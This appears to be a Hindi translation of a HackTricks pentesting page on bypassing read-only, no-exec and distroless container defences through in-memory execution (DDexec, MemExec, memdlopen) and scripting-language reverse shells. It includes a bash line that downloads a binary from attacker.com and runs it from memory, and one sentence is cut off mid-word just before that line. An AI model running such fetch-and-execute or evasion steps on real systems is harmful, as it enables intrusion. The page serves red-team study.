# FS सुरक्षा को छेड़ना: केवल पढ़ने योग्य / कोई निष्पादन / Distroless

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा संग्रह विशेष [**NFTs**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल** हों या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का** **अनुसरण** करें।**
* **अपनी हैकिंग ट्रिक्स को** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें।**

</details>

## वीडियो

निम्नलिखित वीडियो में आप इस पृष्ठ में उल्लिखित तकनीकों को और गहराई से समझ सकते हैं:

* [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## केवल पढ़ने योग्य / कोई निष्पादन स्थिति

अधिकांश लिनक्स मशीनों को **केवल पढ़ने योग्य (ro) फ़ाइल सिस्टम सुरक्षा** के साथ माउंट किया जाना अधिक सामान्य हो रहा है, विशेष रूप से कंटेनर में। इसका कारण एक ro फ़ाइल सिस्टम के साथ एक कंटेनर चलाना **`readOnlyRootFilesystem: true`** को `securitycontext` में सेट करना इतना आसान है:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

हालांकि, यदि फ़ाइल सिस्टम को ro के रूप में माउंट किया गया है, तो **`/dev/shm`** अभी भी लिखने योग्य होगा, इसलिए यह झूठा है कि हम डिस्क में कुछ भी नहीं लिख सकते हैं। हालांकि, इस फ़ोल्डर को **निष्पादन सुरक्षा के साथ माउंट किया जाएगा**, इसलिए यदि आप यहां एक बाइनरी डाउनलोड करते हैं तो आप उसे **निष्पादित नहीं कर पाएंगे**।

{% hint style="warning" %}
रेड टीम के दृष्टिकोण से, यह **कठिन हो जाता है डाउनलोड और निष्पादित करना** बाइनरीज़ जो पहले से सिस्टम में नहीं हैं (जैसे बैकडोर्स या `kubectl` जैसे गणनकों)।
{% endhint %}

## सबसे आसान छेड़छाड़: स्क्रिप्ट

ध्यान दें कि मैंने बाइनरीज़ का उल्लेख किया है, आप किसी भी स्क्रिप्ट को **निष्पादित कर सकते हैं** जब तक इंटरप्रेटर मशीन के अंदर हो, जैसे एक **शेल स्क्रिप्ट** अगर `sh` मौजूद है या एक **पायथन** **स्क्रिप्ट** अगर `python` स्थापित है।

हालांकि, यह केवल आपके बाइनरी बैकडोर या अन्य बाइनरी उपकरणों को निष्पादित करने के लिए पर्याप्त नहीं है।

## मेमोरी छेड़छाड़

यदि आप एक बाइनरी निष्पादित करना चाहते हैं लेकिन फ़ाइल सिस्टम उसे अनुमति नहीं दे रहा है, तो उसे करने का सबसे अच्छा तरीका है **मेमोरी से निष्पादित करना**, क्योंकि **सुरक्षा उसमें लागू नहीं होती है**।

### FD + exec सिस्कॉल छेड़छाड़

यदि आपके पास मशीन के अंदर कुछ शक्तिशाली स्क्रिप्ट इंजन ह
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
इस तकनीक के बारे में अधिक जानकारी के लिए Github या निम्नलिखित लिंक पर जाएं:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) DDexec का प्राकृतिक अगला कदम है। यह एक **DDexec शैलकोड डीमनाइज़्ड** है, इसलिए जब भी आप **एक अलग बाइनरी चलाना चाहें** तो आपको DDexec को फिर से चालू करने की आवश्यकता नहीं होती है, आप सिर्फ मेमेक्सेक शैलकोड को DDexec तकनीक के माध्यम से चला सकते हैं और फिर **इस डीमन के साथ संवाद करके नई बाइनरी लोड और चलाने के लिए**।

आप [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) में **memexec का उपयोग करके PHP रिवर्स शैल से बाइनरी चलाने** का उदाहरण देख सकते हैं।

### Memdlopen

DDexec के समान उद्देश्य के साथ, [**memdlopen**](https://github.com/arget13/memdlopen) तकनीक बाद में उन्हें चलाने के लिए मेमोरी में बाइनरी लोड करने के लिए एक **आसान तरीका** प्रदान करती है। यह बाइनरी को डिपेंडेंसी के साथ लोड करने की भी अनुमति दे सकता है।

## Distroless Bypass

### डिस्ट्रोलेस क्या है

डिस्ट्रोलेस कंटेनर में केवल वही **न्यूनतम घटक होते हैं जो किसी विशेष एप्लिकेशन या सेवा को चलाने के लिए आवश्यक होते हैं**, जैसे पुस्तकालय और रनटाइम डिपेंडेंसी, लेकिन एक पैकेज प्रबंधक, शैल या सिस्टम उपयोगिताएं जैसे बड़े घटकों को छोड़ देते हैं।

डिस्ट्रोलेस कंटेनरों का उद्देश्य है कि वे **अनावश्यक घटकों को हटाकर कंटेनरों के आक्रमण सतह को कम करें** और उनमें से उत्पन्न होने वाली संभावितताओं की संख्या को कम करें।

### रिवर्स शैल

डिस्ट्रोलेस कंटेनर में आपको शायद **`sh` या `bash`** तक नहीं मिलेगा आपको एक साधारित शैल प्राप्त करने के लिए। आपको ऐसे बाइनरी भी नहीं मिलेंगे जैसे `ls`, `whoami`, `id`... वह सब कुछ जो आप सामान्यतः एक सिस्टम में चलाते हैं।

{% hint style="warning" %}
इसलिए, आप **रिवर्स शैल** प्राप्त नहीं कर पाएंगे या आप सामान्यतः करते हैं वैसे ही सिस्टम की **जांच** नहीं कर पाएंगे।
{% endhint %}

हालांकि, यदि प्रभावित कंटेनर उदाहरण के तौर पर एक फ्लास्क वेब चला रहा है, तो पायथन स्थापित है, और इसलिए आप एक **पायथन रिवर्स शैल** प्राप्त कर सकते हैं। यदि यह नोड चला रहा है, तो आप एक नोड रिवर्स शैल प्राप्त कर सकते हैं, और ऐसा ही अधिकांश **स्क्रिप्टिंग भाषाओं** के साथ।

{% hint style="success" %}
स्क्रिप्टिंग भाषा का उपयोग करके आप भाषा की क्षमताओं का उपयोग करके **सिस्टम की जांच** कर सकते हैं।
{% endhint %}

यदि **`read-only/no-exec`** सुरक्षा उपाय नहीं है, तो आप अपने रिवर्स शैल का दुरुपयोग करके अपने बाइनरी को **फ़ाइल सिस्टम में लिख सकते हैं** और **उन्हें चला सकते हैं**।

{% hint style="success" %}
हालांकि, इस तरह के कंटेनर में आमतौर पर ये सुरक्षा उपाय मौजूद होते हैं, लेकिन आप इन्हें उम्मीदवारी करने के लिए **पिछले मेमोरी निष्पादन तकनीकों का उपयोग कर सकते हैं**।
{% endhint %}

आप [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) में कुछ RCE सुरक्षा उपायों का उपयोग करके स्क्रिप्टिंग भाषाओं के **रिवर्स शैल प्राप्त करने** और मेमोरी से बाइनरी चलाने के उदाहरण देख सकते हैं।

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड** करना चाहते हैं? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एकल [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS और HackTricks swag
